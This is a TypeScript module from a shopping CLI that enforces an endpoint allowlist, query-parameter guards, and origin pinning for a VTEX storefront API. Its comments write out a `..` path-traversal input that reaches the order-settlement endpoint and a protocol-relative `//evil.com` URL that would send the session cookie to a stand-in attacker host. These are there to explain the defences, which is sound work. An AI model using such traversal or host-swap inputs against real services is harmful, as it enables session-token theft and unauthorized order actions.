/**
 * The single source of truth for which D1 endpoints this CLI may reach.
 *
 * Used twice, deliberately:
 *
 *   - **At runtime**, by `D1Client.request`, against the fully RESOLVED URL —
 *     after `new URL()` has collapsed any `..` segments AND applied any host
 *     change. Both matter; see `assertAllowedUrl`.
 *   - **Statically**, by `test/safety.test.ts`, against every `/api/` literal
 *     in the source tree.
 *
 * The runtime check is the load-bearing one. A static scan of source literals
 * can always be defeated by assembling a path from fragments, by hiding it in
 * something the extractor skips, or — as happened here — by a `..` traversal
 * that only becomes an endpoint after URL normalization:
 *
 *   d1 search --facets '../../../../../../api/checkout/pub/orderForm/X/transaction'
 *     → GET /api/checkout/pub/orderForm/X/transaction
 *
 * Every literal in the source was approved, and the request still reached the
 * endpoint VTEX uses to settle an order. Checking the resolved pathname closes
 * that whole class, because it inspects what will actually be sent rather than
 * what was written.
 */

import { D1Error, ORIGIN } from "./types.ts";

/** A URL path segment that cannot be a traversal or a separator. */
const SEG = "[^/]+";

/**
 * Endpoints this CLI is permitted to reach, as anchored patterns over the
 * resolved pathname. Every one is a public storefront read or a cart mutation.
 * None of them moves money — see `no pattern admits a payment path` in
 * `test/safety.test.ts`, which guards this list against a careless addition.
 */
export const ALLOWED_ENDPOINT_PATTERNS: readonly RegExp[] = [
  // catalogue — product_search takes a trailing facet path of arbitrary depth
  new RegExp(`^/api/io/_v/api/intelligent-search/product_search(/${SEG})*/?$`),
  new RegExp(`^/api/io/_v/api/intelligent-search/facets/trade-policy/${SEG}$`),
  /^\/api\/io\/_v\/api\/intelligent-search\/autocomplete_suggestions$/,
  /^\/api\/io\/_v\/api\/intelligent-search\/top_searches$/,
  new RegExp(`^/api/catalog_system/pub/category/tree/${SEG}$`),
  // The only route from a SKU id to the product that carries it. Intelligent
  // search cannot do this: `?fq=skuId:262` there is SILENTLY IGNORED and
  // returns the whole 1,600-product catalogue with HTTP 200, which is
  // indistinguishable from a successful narrow query.
  /^\/api\/catalog_system\/pub\/products\/search$/,
  // location
  /^\/api\/checkout\/pub\/regions$/,
  // cart — builds and prices a basket; none of these settle it
  /^\/api\/checkout\/pub\/orderForm$/,
  // Read a specific cart — how the saved address book is reached, since
  // `availableAddresses` is empty on a freshly created orderForm.
  new RegExp(`^/api/checkout/pub/orderForm/${SEG}$`),
  new RegExp(`^/api/checkout/pub/orderForm/${SEG}/items$`),
  new RegExp(`^/api/checkout/pub/orderForm/${SEG}/items/update$`),
  new RegExp(`^/api/checkout/pub/orderForm/${SEG}/items/removeAll$`),
  new RegExp(`^/api/checkout/pub/orderForm/${SEG}/attachments/shippingData$`),
  /^\/api\/checkout\/pub\/orderForms\/simulation$/,
  // identity
  /^\/api\/vtexid\/pub\/authentication\/start$/,
  /^\/api\/vtexid\/pub\/authentication\/accesskey\/send$/,
  /^\/api\/vtexid\/pub\/authentication\/accesskey\/validate$/,
  /^\/api\/vtexid\/pub\/authenticated\/user$/,
  // orders (read-only)
  /^\/api\/oms\/user\/orders\/?$/,
  new RegExp(`^/api/oms/user/orders/${SEG}$`),
];

/**
 * The same set with interpolations collapsed to `{}`, for the static source
 * scan. Kept adjacent to the patterns so the two cannot drift apart —
 * `test/safety.test.ts` asserts every entry here is admitted by some pattern
 * above.
 */
export const ALLOWED_ENDPOINT_SHAPES: readonly string[] = [
  "/api/io/_v/api/intelligent-search/product_search/{}",
  "/api/io/_v/api/intelligent-search/facets/trade-policy/{}",
  "/api/io/_v/api/intelligent-search/autocomplete_suggestions",
  "/api/io/_v/api/intelligent-search/top_searches",
  "/api/catalog_system/pub/category/tree/{}",
  "/api/catalog_system/pub/products/search",
  "/api/checkout/pub/regions",
  "/api/checkout/pub/orderForm",
  "/api/checkout/pub/orderForm/{}",
  "/api/checkout/pub/orderForm/{}/items",
  "/api/checkout/pub/orderForm/{}/items/update",
  "/api/checkout/pub/orderForm/{}/items/removeAll",
  "/api/checkout/pub/orderForm/{}/attachments/shippingData",
  "/api/checkout/pub/orderForms/simulation",
  "/api/vtexid/pub/authentication/start",
  "/api/vtexid/pub/authentication/accesskey/send",
  "/api/vtexid/pub/authentication/accesskey/validate",
  "/api/vtexid/pub/authenticated/user",
  "/api/oms/user/orders",
  "/api/oms/user/orders/{}",
];

/**
 * Per-endpoint query constraints.
 *
 * Every allowlist entry before `catalog_system/pub/products/search` carried its
 * risk in the PATH — that is what the `..`-to-order-settlement incident was
 * about, and why checking the resolved pathname was sufficient. This one is
 * different: `fq` is a **query language**. VTEX accepts `fq=C:/1/`,
 * `fq=alternateIds_RefId:x`, `fq=P:[0 TO 9999]` and `_from`/`_to` paging on the
 * same path, so an approved pathname says nothing about what was asked for.
 *
 * `assertSkuId` guards the one function that builds this call today, but a
 * convention inside a caller is not a shield — a second call site would inherit
 * the approved path and none of the constraint. Proven: a plausible future
 * caller passing an arbitrary `fq` sailed through the static source scan (31
 * pass) and reached D1 with the session cookie attached.
 *
 * So the constraint lives with the endpoint. An entry here means: these are the
 * only parameters this path may carry, and this is what they must look like.
 */
const QUERY_GUARDS: ReadonlyArray<{
  path: RegExp;
  params: Record<string, RegExp>;
}> = [
  {
    path: /^\/api\/catalog_system\/pub\/products\/search$/,
    // Exactly a SKU lookup. `sc` is the sales channel, always a small integer.
    params: { fq: /^skuId:\d+$/, sc: /^\d+$/ },
  },
];

/** Whether a resolved pathname is one this CLI may request. */
export function isAllowedPath(pathname: string): boolean {
  return ALLOWED_ENDPOINT_PATTERNS.some((p) => p.test(pathname));
}

/**
 * Throw unless every query parameter on a guarded path is expected and
 * well-formed. Paths with no guard are unconstrained, as before.
 *
 * Fail-closed on UNKNOWN parameters too, not just malformed known ones —
 * `_from`/`_to` are the whole-catalogue enumeration lever and neither would
 * have tripped a check that only validated `fq`.
 */
export function assertAllowedQuery(pathname: string, query: URLSearchParams): void {
  const guard = QUERY_GUARDS.find((g) => g.path.test(pathname));
  if (!guard) return;
  for (const [key, value] of query) {
    // `Object.hasOwn`, not a bracket-lookup truthiness test: `?constructor=`,
    // `?toString=` and `?valueOf=` resolve up the prototype chain to functions,
    // which are truthy, and the next line then calls `.test` on one — an
    // uncaught TypeError instead of the D1Error this is supposed to raise.
    // Still fail-closed either way, but through the wrong error class and the
    // wrong exit code.
    const expect = Object.hasOwn(guard.params, key) ? guard.params[key] : undefined;
    if (!expect) {
      throw new D1Error(
        `Refusing to send "${key}" to ${pathname} — that endpoint accepts only ${Object.keys(guard.params).join(", ")}. This is a bug in d1-cli.`,
      );
    }
    if (!expect.test(value)) {
      throw new D1Error(
        `Refusing to send ${key}="${value}" to ${pathname} — it must match ${expect.source}. This is a bug in d1-cli.`,
      );
    }
  }
}

/**
 * Throw unless the resolved pathname is approved.
 *
 * Deliberately fail-closed: an unrecognized path is refused rather than passed
 * through with a warning. The whole point is that the unanticipated case stops
 * here, and a warning that nobody reads is indistinguishable from no check.
 */
export function assertAllowedPath(pathname: string, original: string): void {
  if (isAllowedPath(pathname)) return;
  const why =
    pathname === original
      ? "This is a bug in d1-cli."
      : `(Requested as ${original}; path traversal resolved it elsewhere.)`;
  throw new D1Error(`Refusing to call ${pathname} — it is not an approved D1 endpoint. ${why}`);
}

/**
 * Assert the whole resolved URL, not just its path.
 *
 * Checking `pathname` alone is not enough, and the gap is worse than the
 * traversal it was written to close. `new URL()` resolves a protocol-relative
 * or absolute `path` against the base by **replacing the host**:
 *
 *   new URL("//evil.com/api/checkout/pub/regions", ORIGIN)
 *     → host evil.com, pathname /api/checkout/pub/regions   ← an APPROVED path
 *
 * The pathname passes the allowlist, and the request leaves for another host
 * carrying the `VtexIdclientAutCookie` — a session-token exfiltration wearing
 * an approved endpoint's clothes. The origin is therefore pinned first, so a
 * host change fails before the path is ever consulted.
 */
export function assertAllowedUrl(url: URL, original: string): void {
  if (url.origin !== ORIGIN) {
    throw new D1Error(
      `Refusing to call ${url.origin} — d1-cli only talks to ${ORIGIN}. ` +
        `(Requested as ${original}.) A session cookie must never leave D1's origin.`,
    );
  }
  assertAllowedPath(url.pathname, original);
}
